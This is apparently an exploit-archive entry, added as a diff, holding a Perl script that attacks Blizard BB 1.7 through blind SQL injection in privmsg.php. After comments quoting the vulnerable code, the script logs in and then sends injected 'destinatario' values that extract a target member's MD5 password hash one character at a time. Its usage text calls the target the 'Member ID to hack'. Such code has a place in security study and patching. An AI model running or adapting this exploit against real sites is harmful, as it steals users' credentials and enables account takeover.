@@ -1,0 +1,223 @@
+id: 27147
+date: 02/28/2017
+title: Blizard BB 1.7 (privtmsg) MD5 Hash Retrieve Blind sql injection Exploit
+author: StAkeR
+cves: 
+
+#!/usr/bin/perl
+
+# ------------------------------------------------------------------------
+# [+] Blizard BB 1.7 (privtmsg) MD5 Hash Retrieve (blind sql injection)
+# ------------------------------------------------------------------------
+# [*] Discovered by Juri Gianni - Turin,Italy
+# [*] staker - staker[at]hotmail[dot]it / shrod9[at]gmail[dot]com
+# [*] Discovered on 28/02/2017
+# [*] Site Vendor: http://sourceforge.net/projects/blizard/
+# [*] Category: WebApp
+# [*] BUG: Blind SQL Injection
+# --------------------------------------------------------------------------
+#   [-] File privmsg.php
+#
+#   function new_send($pref, $username, $sel_smiles, $data, $newgo){
+#	$destinatario=stripslashes($_POST['destinatario']);
+#	
+#	$checkif = mysql_query("SELECT * FROM ".$pref."_users WHERE username = '$destinatario'");
+#	
+#	$title=stripslashes($_POST['title']);
+#	$message=stripslashes($_POST['message']);
+#
+#    if (empty($title)){
+#    $title="No Title";
+#    }
+#	
+#	if (((!empty($message)) and (mysql_num_rows($checkif) > 0))){  
+#	mysql_query("INSERT INTO ".$pref."_private_messages VALUES ('', '$username', '$destinatario', '$title', '$message', '$data', '0');"); <-- bad query
+#	
+#	echo "<div class='success'>"._PRIVMSG_SENDER_OK."</div>";
+#	redirect("privmsg.php", 2);
+#	} else {
+#		echo "<div class='error'>".PRIVMSG_NOEMPTY."</div>";
+#	}
+# }
+# 
+# ----------------------------------------------------------------------------
+# WWZ :)
+#-----------------------------------------------------------------------------
+
+use strict;
+use IO::Socket::INET;
+
+
+my ($host,$username,$password,$uid) = @ARGV;
+
+
+if (@ARGV != 4) { usage(); }
+
+
+my $path = "/blizardbb17/html/"; # Insert a valid path if required.
+                                 # Change it with your hands
+
+
+my @chars = (48..57, 97..102); 
+my ($i,$ord,$hash) = (1,undef,undef);
+parse_url($host);
+my $cookie = login();
+
+
+
+syswrite(STDOUT, "[-] Trying to retrieve MD5 Hash: ");
+
+for ($i=0;$i<=32;$i++) 
+{
+             			
+   foreach $ord (@chars) 
+   { 
+             
+      if (send_msg(sql($i,$ord)) == 666) 
+	  {  
+	      syswrite(STDOUT,chr($ord));
+		  $hash .= chr($ord);
+		  last;
+	  }
+	  if ($i == 2 and not defined $hash) 
+	  {
+	     syswrite(STDOUT,"\n[-] Exploit Failed");
+		 exit;
+	  }	 
+   }		   
+}
+
+
+
+if (length($hash) == 32) {
+   die "\[-]Exploit Successfully";
+}
+else {
+   die "\n[-] Exploit Failed";
+}   
+
+
+
+sub sql
+{
+      my ($i,$j,$sql) = (shift,shift,undef);
+      
+      $sql = "shrod ' AND ASCII(SUBSTRING((SELECT password FROM bz_users WHERE uid=".$uid."),".$i.",1))=".$j."#";
+             
+      return $sql;        
+}        
+    
+	
+sub parse_url()
+{
+   if ($_[0] =~  m{^http://(.+?)$}i ) { 
+       $_[0] = $1; 
+  }
+}
+
+
+sub login() {
+
+
+my ($PHPSESSID,$content,$packet);
+
+my $data = "username=".$username."&password=".$password."&red_url=".$host.$path."login.php&login=Login";
+
+
+my $socket  = new IO::Socket::INET(
+                                   PeerAddr => $host,
+                                   PeerPort => 80,
+                                   Proto    => 'tcp',
+                                  ) or die $!;
+        
+		
+
+$packet .= "POST ".$path."login.php HTTP/1.1\r\n";
+$packet .= "Host: ".$host."\r\n";
+$packet .= "User-Agent: Lynx (textmode)\r\n";
+$packet .= "Content-Type: application/x-www-form-urlencoded\r\n";
+$packet .= "Content-Length:".length($data)."\r\n";
+$packet .= "Connection: close\r\n\r\n";
+$packet.= $data;
+
+
+$socket->send($packet);
+ 
+ 
+ while (<$socket>) {
+     $content .= $_;
+ }    
+ 
+  
+  if($content =~ /PHPSESSID=(.+?);/) { 
+   $PHPSESSID = $1; 
+   return $PHPSESSID;
+ } 
+  else { 
+     die $!;
+  }
+}
+
+
+
+sub send_msg() {
+
+
+my ($payload,$content,$packet) = (shift,undef,undef);
+
+my $data2 = "title=IZI&destinatario=".$payload."&message=asdasd&newgo=Nuovo+Messaggio";
+
+ 
+my $socket  = new IO::Socket::INET(
+                                   PeerAddr => $host,
+                                   PeerPort => 80,
+                                   Proto    => 'tcp',
+                                  ) or die $!;
+        
+		
+
+$packet .= "POST ".$path."privmsg.php?type=new HTTP/1.1\r\n";
+$packet .= "Host: ".$host."\r\n";
+$packet .= "User-Agent: Lynx (textmode)\r\n";
+$packet .= "Content-Type: application/x-www-form-urlencoded\r\n";
+$packet .= "Cookie: PHPSESSID=".$cookie."\r\n";
+$packet .= "Content-Length:".length($data2)."\r\n";
+$packet .= "Connection: close\r\n\r\n";
+$packet.= $data2;
+
+
+$socket->send($packet);
+ 
+ 
+ while (<$socket>) {
+     $content .= $_;
+ }    
+ 
+
+if ($content  =~ /Messaggio inviato/) {
+    return 666;
+}
+else { 
+    return 0; }
+}
+
+
+sub usage() {
+        
+        print "[*---------------------------------------------------------*]\n".
+              "[* Blizard BB 1.7 (privtmsg) Blind SQL Injection Exploit   *]\n".
+              "[*---------------------------------------------------------*]\n". 
+              "[* Usage: perl web.pl [host] [username] [password] [uid]   *]\n".
+              "[*                                                         *]\n".
+              "[* Options:                                                *]\n".
+              "[* [host] insert a valid host                              *]\n".
+              "[* [username] insert your username                         *]\n".
+	      "[* [password] insert your password                         *]\n".
+              "[* [uid] Member ID to hack                                 *]\n".
+	      "[*---------------------------------------------------------*]\n";	
+      exit;			  
+   
+}
+
+
+#  0day.today [2023-03-23]  #
